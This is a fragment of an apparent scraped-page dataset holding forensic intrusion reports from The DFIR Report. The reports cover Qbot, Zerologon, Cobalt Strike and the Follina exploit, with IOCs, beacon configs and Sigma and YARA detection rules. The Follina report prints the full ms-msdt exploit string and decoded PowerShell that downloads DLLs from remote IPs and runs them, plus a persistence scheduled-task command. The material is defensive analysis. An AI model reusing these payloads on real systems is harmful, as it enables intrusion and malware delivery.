[25:fe:be:6d:0e:8d:48:5a:94:cf:46:84:d7:7e:ff:bf:47:aa:04:5c ] Not Before: 2021/11/07 03:00:53 UTC Not After: 2022/02/05 03:00:52 UTC Issuer Org: Let's Encrypt Subject Common: dxabt[.]com [dxabt[.]com,ns1.dxabt[.]com,ns2.dxabt[.]com,ns3.dxabt[.]com,ns4.dxabt[.]com Public Algorithm: rsaEncryption JA3: 0eecb7b1551fba4ec03851810d31743f JA3s: ae4edc6faf64d08308082ad26be60767 Config: { \"x64\": { \"uri_queried\": \"/tRPG\", \"sha256\": \"dec25fc2fe7e76fe191fbfdf48588c4325f52bfe2769fbc88a5614541c1075eb\", \"config\": { \"HTTP Method Path 2\": \"/faq\", \"Jitter\": 79, \"C2 Server\": \"dxabt[.]com,/case\", \"Spawn To x86\": \"%windir%\\\\syswow64\\\\runonce.exe\", \"Method 1\": \"GET\", \"C2 Host Header\": \"\", \"Method 2\": \"POST\", \"Watermark\": 426352781, \"Spawn To x64\": \"%windir%\\\\sysnative\\\\runonce.exe\", \"Beacon Type\": \"8 (HTTPS)\", \"Port\": 443, \"Polling\": 53988 }, \"time\": 1637416040175.3, \"md5\": \"30cc71d5b5d7778774c54486558690d3\", \"sha1\": \"5f36c6cffdbae0d631c8889b4d9bad1248f899b3\" }, \"x86\": { \"uri_queried\": \"/Mr0m\", \"sha256\": \"a992d57b2f6164e599952ea3c245962824ad17166684ed45e987efe80ebe611f\", \"config\": { \"HTTP Method Path 2\": \"/faq\", \"Jitter\": 79, \"C2 Server\": \"dxabt[.]com,/case\", \"Spawn To x86\": \"%windir%\\\\syswow64\\\\runonce.exe\", \"Method 1\": \"GET\", \"C2 Host Header\": \"\", \"Method 2\": \"POST\", \"Watermark\": 426352781, \"Spawn To x64\": \"%windir%\\\\sysnative\\\\runonce.exe\", \"Beacon Type\": \"8 (HTTPS)\", \"Port\": 443, \"Polling\": 53988 }, \"time\": 1637416038974.9, \"md5\": \"c1fd49c043894c1dff8bc02b17f8942c\", \"sha1\": \"e915f74be310b1687db6b290af2f78583a981512\" } } Exfiltration While the threat actors were active in the environment, we received 3 different alerts stating that someone had opened canary documents from the IP address 91.193.182[.]165. These alerts tell us that data was indeed exfiltrated from the environment. The threat actors were most interested in files concerning financial statements, ransomware reports, and salary data. The C2 channel was encrypted and multiple connections were established with the internal file server. No other traffic was observed for possible exfiltration leading us to the conclusion that the command and control channel was used for the exfiltration. At 17:35 UTC, the Cobalt Strike Beacon was deployed on the File Server. According to the number of connections to the C2 from the File Server per minute, we can conclude that exfiltration was done between 17:52 UTC and 18:00 UTC. Spike in traffic from file share server to Cobalt Strike command and control server. IOCs Network QBOT 24.229.150[.]54:995 - avlhestito[.]us 41.228.22[.]180:443 - xrhm[.]info Cobalt Strike 5.255.98[.]144:8888 / dxabt[.]com 5.255.98[.]144:443 / dxabt[.]com 5.255.98[.]144:8080 / dxabt[.]com File Intial Exec Qbot DLL MD5:53510e20efb161d5b71c4ce2800c1a8d SHA1:2268178851d0d0debb9ab457d73af8a5e50af168 SHA2:e2bc969424adc97345ac81194d316f58da38621aad3ca7ae27e40a8fae582987 QBot DLL (extracted from registry): MD5:312e52b4109741893f17bc524084100f SHA1:7ca650945223eab088f43fd472e3592be2ed9d32 SHA2:4d3b10b338912e7e1cbade226a1e344b2b4aebc1aa2297ce495e27b2b0b5c92b cool.exe MD5:59E7F22D2C290336826700F05531BD30 SHA1:3B2A0D2CB8993764A042E8E6A89CBBF8A29D47D1 SHA256:F63E17FF2D3CFE75CF3BB9CF644A2A00E50AAFFE45C1ADF2DE02D5BD0AE35B0 Detections Network ET POLICY Powershell Activity Over SMB - Likely Lateral Movement ET POLICY Command Shell Activity Using Comspec Environmental Variable Over SMB - Very Likely Lateral Movement ET RPC DCERPC SVCCTL - Remote Service Control Manager Access ET CNC Feodo Tracker Reported CnC Server group 15 ET CNC Feodo Tracker Reported CnC Server group 16 The following rules may cause performance issues (and are disabled by default) according to @ET_Labs ET EXPLOIT Possible Zerologon NetrServerReqChallenge with 0x00 Client Challenge (CVE-2020-1472) - 2030870 ET EXPLOIT Possible Zerologon NetrServerAuthenticate with 0x00 Client Credentials (CVE-2020-1472) 2030871 ET EXPLOIT [401TRG] Possible Zerologon (CVE-2020-1472) UUID flowbit set - 2030888 ET EXPLOIT [401TRG] Possible Zerologon (CVE-2020-1472) M2 - 2030889 New signatures thanks to @ET_Labs ! 2035258 - ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate2 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M1 2035259 - ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate2 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M2 2035260 - ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate3 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M1 2035261 - ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate3 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M2 2035262 - ET EXPLOIT Zerologon Phase 3/3 - Malicious NetrServerPasswordSet2 (CVE-2020-1472) 2035263 - ET EXPLOIT Zerologon Phase 3/3 - NetrLogonSamLogonWithFlags Request with 0x00 Client Credentials (CVE-2020-1472) Sigma title: Scheduled task executing powershell encoded payload from registry status: Experimental description: Detects the creation of a schtask that executes a base64 encoded payload stored in the Windows Registry using PowerShell. author: @Kostastsale , @TheDFIRReport references: - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/ date: 2022/02/12 logsource: product: windows category: process_creation detection: selection1: Image|endswith: '\\schtasks.exe' CommandLine|contains|all: - '/Create' - '/SC' selection2: CommandLine|contains|all: - 'FromBase64String' - 'powershell' - 'Get-ItemProperty' - 'HKCU:' condition: selection1 and selection2 falsepositives: - Uknown level: high tags: - attack.execution - attack.persistence - attack.t1053.005 - attack.t1059.001 title: Execution of ZeroLogon PoC executable status: Experimental description: Detects the execution of the commonly used ZeroLogon PoC executable. author: @Kostastsale, @TheDFIRReport references: - https://thedfirreport.com/2021/11/01/from-zero-to-domain-admin/ - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/ date: 2022/02/12 logsource: product: windows category: process_creation detection: selection1: ParentImage|endswith: - '\\cmd.exe' Image|endswith: - '\\cool.exe' - '\\zero.exe' CommandLine|contains|all: - 'Administrator' - '-c' selection2: CommandLine|contains|all: - 'taskkill' - '/f' - '/im' selection3: CommandLine|contains: - 'powershell' condition: selection1 and (selection2 or selection3) falsepositives: - Uknown level: high tags: - attack.execution - attack.lateral_movement - attack.T1210 title: Enabling RDP service via reg.exe command execution status: Experimental description: Detects the execution of reg.exe and subsequent command line arguments for enabling RDP service on the host author: @Kostastsale , @TheDFIRReport references: - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/ date: 2022/02/12 logsource: product: windows category: process_creation detection: selection1: Image|endswith: - '\\reg.exe' CommandLine|contains|all: - 'add' - 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' - 'REG_DWORD' Winstations1: CommandLine|contains: - 'WinStations\\RDP-Tcp' Winstations2: CommandLine|contains: - 'MaxInstanceCount' - 'fEnableWinStation' selection2: CommandLine|contains|all: - 'Licensing Core' - 'EnableConcurrentSessions' selection3: CommandLine|contains: - 'TSUserEnabled' - 'TSEnabled' - 'TSAppCompat' - 'IdleWinStationPoolCount' - 'TSAdvertise' - 'AllowTSConnections' - 'fSingleSessionPerUser' condition: selection1 and ((Winstations1 and Winstations2) or (selection2 or selection3)) falsepositives: - Uknown level: high tags: - attack.defense_evasion - attack.lateral_movement - attack.t1021.001 - attack.t1112 https://github.com/SigmaHQ/sigma/blob/a502f316efdcc8c174b7cf412029dfae5b3552c8/rules/windows/builtin/security/win_pass_the_hash_2.yml https://github.com/SigmaHQ/sigma/blob/940f89d43dbac5b7108610a5bde47cda0d2a643b/rules/windows/registry/registry_set/registry_set_powershell_as_service.yml https://github.com/SigmaHQ/sigma/blob/940f89d43dbac5b7108610a5bde47cda0d2a643b/rules/windows/registry/registry_set/registry_set_cobaltstrike_service_installs.yml https://github.com/SigmaHQ/sigma/blob/33b370d49bd6aed85bd23827aa16a50bd06d691a/rules/windows/process_creation/proc_creation_win_susp_net_execution.yml https://github.com/SigmaHQ/sigma/blob/1f8e37351e7c5d89ce7808391edaef34bd8db6c0/rules/windows/process_creation/proc_creation_win_schtasks_reg_loader.yml https://github.com/SigmaHQ/sigma/blob/1f8e37351e7c5d89ce7808391edaef34bd8db6c0/rules/windows/process_creation/proc_creation_win_nltest_recon.yml https://github.com/SigmaHQ/sigma/blob/1f8e37351e7c5d89ce7808391edaef34bd8db6c0/rules/windows/process_creation/proc_creation_win_susp_whoami.yml Yara /* YARA Rule Set Author: The DFIR Report Date: 2022-02-20 Identifier: Case 8734 Reference: https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/ */ /* Rule Set ----------------------------------------------------------------- */ import \"pe\" rule qbot_8734_payload_dll { meta: description = \"files - file e2bc969424adc97345ac81194d316f58da38621aad3ca7ae27e40a8fae582987\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2022-02-20\" hash1 = \"e2bc969424adc97345ac81194d316f58da38621aad3ca7ae27e40a8fae582987\" strings: $s1 = \"Terfrtghygine.dll\" fullword ascii $s2 = \"Winamp can read extended metadata for titles. Choose when this happens:\" fullword wide /* Goodware String - occured 1 times */ $s3 = \"Read metadata when file(s) are loaded into Winamp\" fullword wide /* Goodware String - occured 1 times */ $s4 = \"Use advanced title formatting when possible\" fullword wide /* Goodware String - occured 1 times */ $s5 = \"PQVW=!?\" fullword ascii $s6 = \"Show underscores in titles as spaces\" fullword wide /* Goodware String - occured 1 times */ $s7 = \"Advanced title display format :\" fullword wide /* Goodware String - occured 1 times */ $s8 = \"CreatePaint\" fullword ascii $s9 = \"PQRVW=2\\\"\" fullword ascii $s10 = \"Advanced Title Formatting\" fullword wide /* Goodware String - occured 1 times */ $s11 = \"Read metadata when file(s) are played or viewed in the playlist editor\" fullword wide /* Goodware String - occured 1 times */ $s12 = \"Show '%20's in titles as spaces\" fullword wide /* Goodware String - occured 1 times */ $s13 = \"Example : \\\"%artist% - %title%\\\"\" fullword wide /* Goodware String - occured 1 times */ $s14 = \"PQRVW=g\" fullword ascii $s15 = \"PQRW=e!\" fullword ascii $s16 = \"ATF Help\" fullword wide /* Goodware String - occured 1 times */ $s17 = \"(this can be slow if a large number of files are added at once)\" fullword wide /* Goodware String - occured 1 times */ $s18 = \"PQRVW=$\" fullword ascii $s19 = \"Metadata Reading\" fullword wide /* Goodware String - occured 1 times */ $s20 = \"Other field names: %artist%, %album%, %title%, %track%, %year%, %genre%, %comment%, %filename%, %disc%, %rating%, ...\" fullword wide /* Goodware String - occured 1 times */ condition: uint16(0) == 0x5a4d and filesize < 2000KB and ( pe.imphash() == \"aa8a9db10fba890f8ef9edac427eab82\" and pe.exports(\"CreatePaint\") or 8 of them ) } rule qbot_dll_8734 { meta: description = \"files - qbot.dll\" author = \"TheDFIRReport\" reference = \"QBOT_DLL\" date = \"2021-12-04\" hash1 = \"4d3b10b338912e7e1cbade226a1e344b2b4aebc1aa2297ce495e27b2b0b5c92b\" strings: $s1 = \"Execute not supported: %sfField '%s' is not the correct type of calculated field to be used in an aggregate, use an internalcalc\" wide $s2 = \"IDAPI32.DLL\" fullword ascii $s3 = \"ResetUsageDataActnExecute\" fullword ascii $s4 = \"idapi32.DLL\" fullword ascii $s5 = \"ShowHintsActnExecute\" fullword ascii $s6 = \"OnExecute@iG\" fullword ascii $s7 = \"OnExecutexnD\" fullword ascii $s8 = \"ShowShortCutsInTipsActnExecute\" fullword ascii $s9 = \"ResetActnExecute \" fullword ascii $s10 = \"RecentlyUsedActnExecute\" fullword ascii $s11 = \"LargeIconsActnExecute\" fullword ascii $s12 = \"ResetActnExecute\" fullword ascii $s13 = \"OnExecute<\" fullword ascii $s14 = \"TLOGINDIALOG\" fullword wide $s15 = \"%s%s:\\\"%s\\\";\" fullword ascii $s16 = \":\\\":&:7:?:C:\\\\:\" fullword ascii /* hex encoded string '|' */ $s17 = \"LoginPrompt\" fullword ascii $s18 = \"TLoginDialog\" fullword ascii $s19 = \"OnLogin\" fullword ascii $s20 = \"Database Login\" fullword ascii condition: uint16(0) == 0x5a4d and filesize < 3000KB and 8 of the MITRE Exploitation for Privilege Escalation \u2013 T1068 Service Execution \u2013 T1569.002 Network Share Discovery \u2013 T1135 Pass the Hash \u2013 T1550.002 PowerShell \u2013 T1059.001 Windows Command Shell \u2013 T1059.003 Network Share Discovery \u2013 T1135 Obfuscated Files or Information \u2013 T1027 Scheduled Task \u2013 T1053.005 Process Injection \u2013 T1055 Remote System Discovery \u2013 T1018 Obfuscated Files or Information \u2013 T1027 Domain Trust Discovery \u2013 T1482 Domain Groups \u2013 T1069.002 System Owner/User Discovery \u2013 T1033 Network Share Discovery \u2013 T1135 Remote Services \u2013 T1021 Local Account \u2013 T1087.001 Security Software Discovery \u2013 T1518.001 Internal case 8734 Share this: Share on X (Opens in new window) X Share on LinkedIn (Opens in new window) LinkedIn Share on Reddit (Opens in new window) Reddit Share on Facebook (Opens in new window) Facebook Share on WhatsApp (Opens in new window) WhatsApp Related Post navigation Qbot Likes to Move It, Move It 2021 Year In Review Search for: Type your email\u2026 Subscribe Reports Threat Intelligence Detection Rules DFIR Labs Proudly powered by WordPress | Copyright 2023 | The DFIR Report | All Rights Reserved Go Top",
    "expected_count": 0
  },
  {
    "url": "https://thedfirreport.com/2022/10/31/follina-exploit-leads-to-domain-compromise/",
    "title": "Follina Exploit Leads to Domain Compromise \u2013 The DFIR Report",
    "content": "Follina Exploit Leads to Domain Compromise \u2013 The DFIR Report Skip to content Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts The DFIR Report Real Intrusions by Real Attackers, The Truth Behind the Intrusion Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Thursday, February 12, 2026 Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts adfind cobaltstrike Qbot Follina Exploit Leads to Domain Compromise October 31, 2022 In early June 2022, we observed an intrusion where a threat actor gained initial access by exploiting the CVE-2022-30190 (Follina) vulnerability which triggered a Qbot infection chain. Qbot, also known as Qakbot or Pinksliplot is actively developed and capable of a number of functions from reconnaissance, lateral movement, data exfiltration, to delivering other payloads acting as an initial access broker. Qbot is regarded by US CERT as being one of the 2021 Top Malware Strains in Alert (AA22-216A) . In the past we\u2019ve covered other intrusion cases where Qbot was used as an initial access vector. See our reports titled \u201c Qbot and Zerologon Lead To Full Domain Compromise \u201d and \u201c Qbot Likes to Move It, Move It \u201c. In this intrusion, soon after execution of the Qbot payload, the malware established C2 connectivity and performed discovery activity on the beachhead host. Along the way, the threat actors pivoted to multiple systems and installed remote management tools such as NetSupport and Atera Agent, and utilized the ubiquitous Cobalt Strike for maintaining access to the network. The intrusion lasted 2 days, and the attackers ultimately showed interest in accessing sensitive documents hosted on a file server, after which, they exited the environment. Case Summary In this intrusion, a threat actor abused the CVE-2022-30190 (Follina) vulnerability, where exploit code was embedded inside a malicious Word document to gain initial access. We assess with medium to high confidence that the documents likely arrived by the means of thread-hijacked emails from distribution channels used by TA570 . Upon execution of the weaponized Word document, a HTML file was retrieved from a remote server containing a PowerShell payload. The payload contains base64-encoded content and is used to download Qbot DLLs inside the user\u2019s Temp directory. The Qbot DLL was executed via regsvr32.exe and the activity was immediately followed by injection into legitimate processes (explorer.exe) on the host. The injected process spawned Windows utilities such as whoami , net.exe and nslookup , to perform discovery activity and also established connection to Qbot C2 servers. Almost an hour later, the threat actors leveraged a Windows built-in utility, esentutl.exe , to extract browser data, a technique also observed in earlier cases. [ 1 ][ 2 ] Qbot used scheduled task creation as a persistence mechanism. The scheduled task contained a PowerShell command referencing multiple C2 IP addresses stored as base64-encoded blob in randomly named keys under the HKCU registry hive. After this activity, the threat actor proceeded with the remote creation of Qbot DLLs over SMB on multiple hosts throughout the environment. They then added multiple folders to the Windows Defender exclusions list on each of the infected machines to evade defenses, as we have seen before with Qbot. Remote services were then used to execute the DLLs. A Cobalt Strike server connection was witnessed within the first hour, but it wasn\u2019t until after lateral movement occurred that activity from that server began. Utilities such as nltest.exe and AdFind were executed by the injected Cobalt Strike process (explorer.exe). The injected process was also used to access the LSASS system process. Then, the threat actors installed a remote management tool named NetSupport Manager. Within 20 minutes of the installation, the threat actor moved laterally to the domain controller via a Remote Desktop session. On the domain controller, the tool Atera Remote Management was deployed, a popular tool used by attackers for controlling victim machines. This was the last adversarial activity observed for the day. The threat actors checked-in early the next day and downloaded a tool named Network Scanner by SoftPerfect on a domain controller. The tool was executed, which ran a port scan across the network. Finally, the threat actors connected to one of the file share servers via RDP and accessed sensitive documents. No further attacker activity was observed before the threat actors were evicted from the environment. Services We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, Qbot, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here . We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services. Timeline Analysis and reporting completed by @ pigerlin , @yatinwad and @_pete_0 . Infection graph: Initial Access Ever since the disclosure of the Follina vulnerability (CVE-2022-30190) earlier this year, threat actors have been known to leverage the flaw in various phishing campaigns. Delivery of this intrusion was linked to TA570, using hijacked email threads to deliver the initial payload. This intrusion started after a Word document, weaponized with Follina exploit code, was used to deliver and infect the host with Qbot malware. When dealing with a Word document based on the OOXML format, associated files and folders are stored within a compressed ZIP archive. These items can be easily extracted by using an arbitrary zip utility like unzip . One of the embedded files that requires inspection during the analysis of a Follina maldoc, is named document.xml.rels This \u201crelationship\u201d (RELS) file contained an external reference to a remote HTML file, configured to be retrieved and loaded when the Word document is opened, or viewed in Preview Mode. At the bottom of the retrieved HTML page source, the script tag was defined and contained malicious JavaScript code that called the ms-msdt scheme. ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'Unicode.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'JABwACAAPQAgACQARQBuAHYAOgB0AGUAbQBwADsAaQB3AHIAIABoAHQAdABwADoALwAvADEAMAA0AC4AMwA2AC4AMgAyADkALgAxADMAOQAvACQAKAByAGEAbgBkAG8AbQApAC4AZABhAHQAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAHAAXAB0AC4AQQA7AGkAdwByACAAaAB0AHQAcAA6AC8ALwA4ADUALgAyADMAOQAuADUANQAuADIAMgA4AC8AJAAoAHIAYQBuAGQAbwBtACkALgBkAGEAdAAgAC0ATwB1AHQARgBpAGwAZQAgACQAcABcAHQAMQAuAEEAOwBpAHcAcgAgAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADMANAAuADIANAA3AC4AMQAxADkALwAkACgAcgBhAG4AZABvAG0AKQAuAGQAYQB0ACAALQBPAHUAdABGAGkAbABlACAAJABwAFwAdAAyAC4AQQA7AHIAZQBnAHMAdgByADMAMgAgACQAcABcAHQALgBBADsAcgBlAGcAcwB2AHIAMwAyACAAJABwAFwAdAAxAC4AQQA7AHIAZQBnAHMAdgByADMAMgAgACQAcABcAHQAMgAuAEEA'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\" When a system is vulnerable to Follina (CVE-2022-30190), the code will be interpreted and executed by msdt.exe (Microsoft Support Diagnostic Tool). A good detection opportunity is to monitor for this process being spawned by a Microsoft Office application such as WINWORD.EXE In our case, the payload contained base64-encoded PowerShell code. The decoded payload is also logged in EventID 4104 (script block logging) upon execution by the PowerShell engine. The Follina payload was designed to download Qbot libraries from three different URLs, drop the files inside the user\u2019s temp directory, and finally execute the DLLs using regsvr32.exe $p = $Env:temp iwr http://104.36.229.139/$(random).dat -OutFile $p\\t.A iwr http://85.239.55.228/$(random).dat -OutFile $p\\t1.A iwr http://185.234.247.119/$(random).dat -OutFile $p\\t2.A regsvr32 $p\\t.A regsvr32 $p\\t1.A regsvr32 $p\\t2.A Execution Upon execution of the MSDT payload, a new instance of the sdiagnhost.exe (Scripted Diagnostics Native Host) was spawned. This process was ultimately responsible for invoking the Follina payload, starting, in our case, three child instances of regsrv32.exe . After execution of the payload, the XML file PCW.debugreport.xml was created in the %localappdata%\\Diagnostics. directory. This file can serve as a valuable artifact when analyzing Follina exploitation (attempts). The payload, preceded by its recursive path, can be found in the TargetPath element of this XML-file. The payload configured to execute on the system is embedded in this file. Persistence Qbot maintained persistence by creating scheduled tasks across multiple endpoints. An example of a command that was executed can be seen below: schtasks.exe /Create /F /TN \"{E9ADEA37-C329-4967-9CF5-2682DA7D97BE}\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\Benfouqcgq).rxftejkhydnwmpt))) The scheduled task creation events were recorded in the Microsoft-Windows-TaskScheduler/Operational log. Inspection of the scheduled task showed that PowerShell referenced a registry key with a random generated value. This value differed from endpoint to endpoint: The data of this registry key consisted of a base64-encoded string: Decoding the base64-encoded string revealed a significant number of QBot\u2019s C2 IPv4 addresses and ports: C2 IPv4s are provided in the IoC section of this report. The SysWow64\\Explorer.exe process was also observed cycling through a number of domains \u2013 indicated by the DNS requests with a QueryStatus of RCODE:0 (NO ERROR). In addition, several connectivity checks were made to email relay services: Defense Evasion As reported earlier this year, QBot is known for using process hollowing. In this case, the 32-bit version of explorer.exe (indicated by the use of C:\\Windows\\SysWOW64) was started in a suspended state, which was then used as a target for injection. Inspecting memory dumped from the host, the injected processes were easy to discover using Volatility and the malfind module. Looking for output that included explorer.exe and contains the VAD tag PAGE_EXECUTE_READWRITE and MZ headers in the memory space, common attributes observed for process injection in memory. The injected explorer.exe process was used to spawn and inject into additional instances of explorer.exe (32-bit). An example event can be seen below. Source PID 11672 belonging to QBot, injected a DLL into PID 3592, which we discovered was part of Cobalt Strike C2 communication Using the injected process id\u2019s, and process names, we can then match that to the network connections observed using the volatility netscan module, discovering both the injected Qbot (PID 3992) and Cobalt strike (PID 5620) explorer processes. (The data below comes from a different host than the prior log.) Various folders were added as an exclusion for Windows Defender, commonly used by QBot, as a \u2018drop zone\u2019 for both execution and persistence. Credential Access Qbot attempted to steal credentials from the Credentials Manager. On one of the targeted systems, the injected explorer process opened a handle with suspicious access rights to a thread in the LSASS process. Credential dumping tools like Mimikatz often request this level of access and corresponds to the following access rights: PROCESS_VM_READ (0x0010) PROCESS_QUERY_INFORMATION (0x0400) PROCESS_QUERY_LIMITED_INFORMATION (0x1000) PROCESS_ALL_ACCESS (0x1fffff) We observed the LSASS process interaction from the injected Explorer process at two different access levels, 0x1410: In addition, on one host, the average LSASS interaction, with access right 0x1FFFFF (PROCESS_ALL_ACCESS) by the explorer process was ~13K every two hours. A significant volume of events. The article \u201c You Bet Your Lsass: Hunting LSASS Access \u201d by Splunk details examples of LSASS credential dumping. Discovery The following discovery commands were initiated by Qbot through the injected process on the beachhead system: whoami /all cmd /c set net view /all ipconfig /all net share nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.DOMAIN net localgroup netstat -nao route print net group /domain net group \"Domain Computers\" /domain C:\\Windows\\System32\\cmd.exe /C c:\\windows\\sysnative\\nltest.exe /domain_trusts /all_trusts Later, more discovery commands were observed from the Cobalt Strike injected process on another victim system: net group \"domain controllers\" /dom net group \"domain admins\" /dom C:\\Windows\\system32\\cmd.exe /C ping -n 1 <Redacted> On the same host, AdFind was executed to enumerate all computer objects in the Active Directory domain: On second day of the intrusion, threat attackers downloaded a tool named Network Scanner (netscan.exe) by SoftPerfect on the domain controller, using Internet Explorer. The tool was used to trigger another port scan, this time targeting TCP ports 445 and 3389. Periodic requests to api.ipify.org were observed throughout the intrusion by the SysWOW64\\Explorer process and by the ATERA agent. Ipify.org can be used to determine the public facing IPv4 address of the network. We\u2019ve observed the use of ipify.org in previous cases. Lateral Movement Qbot DLLs were created remotely from the beachhead host and saved in the administrative C$ share of other hosts within the network. This activity was also clearly visible in Zeek SMB File data in the network. A local service was also registered on each of the targeted systems, configured to execute the Qbot DLL using regsvr32.exe The following Suricata signatures identified both the remote file creation and service registration events: ET RPC DCERPC SVCCTL - Remote Service Control Manager Access ET POLICY SMB Executable File Transfer ET POLICY SMB2 NT Create AndX Request For a DLL File - Possible Lateral Movement Execution of the new service was observed shorty after invoking the Qbot DLL. The threat actor also used RDP to pivot between systems on the network such as a domain controller and a file server. The creation of the rdpclip.exe process on the target host is another indication that a RDP connection was successful. The start of this process by a non-human account is another great detection opportunity. Collection Qbot used various information stealing modules to extract sensitive information from the beachhead host. Outlook was started, possibly to steal e-mail messages. However, we could not find evidence to conclusively support this. Qbot also used the Windows built-in utility esentutl.exe to extract browser data from Internet Explorer and Microsoft Edge: esentutl.exe /r V01 /l\"C:\\Users\\<redacted>\\AppData\\Local\\Microsoft\\Windows\\WebCache\" /s\"C:\\Users\\<redacted>\\AppData\\Local\\Microsoft\\Windows\\WebCache\" /d\"C:\\Users\\<redacted>\\AppData\\Local\\Microsoft\\Windows\\WebCache\" On a file server, we observed the threat actor manually inspecting files using various built-in viewers. For example, for viewing PDF files, Internet Explorer was used to view these files. For DOCX files, WordPad was used. An indication that these files were viewed locally on the network, was the presence of the \u2018OpenWith\u2019 process: Command and Control The following C2 IP-addresses/domains belonging to Qbot were recorded during this intrusion: 144.202.3[.]39 subject: CN=pesqfbmfk.us,OU=Mklbwanvv Kibn Fykniqfvki,C=FR, issuer: CN=pesqfbmfk.us,O=Jgi Vwmmuia Inc.,L=Rnhsjsu Bbrwua,ST=QQ,C=FR ja3: 72a589da586844d7f0818ce684948eea ja3s: 8ed408107f89c53261bf74e58517bc76 176.67.56[.]94 domain: visdeirun.net issuer: Scau Lofoefo Cubhfilnb Ixtfb ja3: 72a589da586844d7f0818ce684948eea ja3s: 7c02dbae662670040c7af9bd15fb7e2f 72.252.157[.]93 subject: CN=rfhmw.biz,OU=Yoefut,C=ES, issuer: CN=rfhmw.biz,O=Umalauqv Tyv LLC.,L=Ojaomei Xyaik,ST=LO,C=ES ja3: 72a589da586844d7f0818ce684948eea ja3s: 7c02dbae662670040c7af9bd15fb7e2f 90.120.65[.]153 subject: CN=jaubai.net,OU=Naha,C=AU, issuer: CN=jaubai.net,O=Riwi Ohbptdbe LLC.,L=Bia,ST=PX,C=AU ja3: 72a589da586844d7f0818ce684948eea ja3s: 7c02dbae662670040c7af9bd15fb7e2f 67.209.195[.]198 domain: visdeirun.net issuer: Aigmx Ijocl Ooeymfx Eiav LLC. ja3: 72a589da586844d7f0818ce684948eea ja3s: 7c02dbae662670040c7af9bd15fb7e2f The (default) named pipe postex_4c14 was observed from a Cobalt Strike injected explore.exe process. After dumping one of the injected explorer.exe processes, we were able to extract the beacon configuration using the 1768.py tool, by Didier Stevens. More details about this IP-address: 190.123.44[.]126 certificate.version: 3, certificate.serial: 048734AF86D7FBFE4F2161FA60799FD94C5C, certificate.subject: CN=mssfr.icu, certificate.issuer: CN=R3,O=Let's Encrypt,C=US, certificate.not_valid_before: 1653499104, certificate.not_valid_after: 1661275103, certificate.key_alg: rsaEncryption, certificate.sig_alg: sha256WithRSAEncryption, certificate.key_type: rsa, certificate.key_length: 2048, certificate.exponent: 65537, san.dns: [ mssfr.icu, ns1.mssfr.icu, ns2.mssfr.icu, ns3.mssfr.icu, ns4.mssfr.icu ] ja3: 72a589da586844d7f0818ce684948eea ja3s: ae4edc6faf64d08308082ad26be60767 Cobalt Strike config: { \"beacontype\": [ \"HTTPS\" ], \"sleeptime\": 50845, \"jitter\": 33, \"maxgetsize\": 2796804, \"spawnto\": \"AAAAAAAAAAAAAAAAAAAAAA==\", \"license_id\": 426352781, \"cfg_caution\": false, \"kill_date\": null, \"server\": { \"hostname\": \"190.123.44.126\", \"port\": 443, \"publickey\": \"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCCECwaMVRPp+F4nPGpvBL6UPyzeC6MLum39i8TGRcleTtJowVYODCJ3sJPL/0ZAPx+tvaxyzR4wfwGUsPKf9AClWbCWREmZzCyYq2G9RPsGC94ywE68mFQJk3qjZH0scYOVcLz5snPsRWn5U2joATJesQWQ/EnQMZadYFa73i8YQIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==\" }, \"host_header\": \"\", \"useragent_header\": null, \"http-get\": { \"uri\": \"/maximum.png\", \"verb\": \"GET\", \"client\": { \"headers\": null, \"metadata\": null }, \"server\": { \"output\": [ \"print\", \"prepend 600 characters\", \"base64\", \"netbios\" ] } }, \"http-post\": { \"uri\": \"/dividend\", \"verb\": \"POST\", \"client\": { \"headers\": null, \"id\": null, \"output\": null } }, \"tcp_frame_header\": 